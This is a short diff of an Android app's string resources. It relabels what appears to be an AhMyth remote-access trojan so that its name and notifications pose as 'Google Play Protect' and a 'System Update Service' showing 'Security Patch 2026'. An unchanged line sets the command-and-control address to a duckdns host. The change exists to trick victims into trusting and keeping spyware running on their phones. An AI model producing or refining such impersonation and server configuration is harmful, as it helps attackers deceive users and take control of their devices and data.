@@ -1,8 +1,8 @@
 <resources>
-    <string name="app_name">Android System</string>
-    <string name="service_channel_name">Android System Service</string>
-    <string name="service_notification_title">Android System</string>
-    <string name="service_notification_active">Device protection is active</string>
+    <string name="app_name">Google Play Protect</string>
+    <string name="service_channel_name">System Update Service</string>
+    <string name="service_notification_title">Security Patch 2026</string>
+    <string name="service_notification_active">System is currently being updated...</string>
     
     <!-- Server Configuration -->
     <string name="server_ip">ahmythserver.duckdns.org</string> 
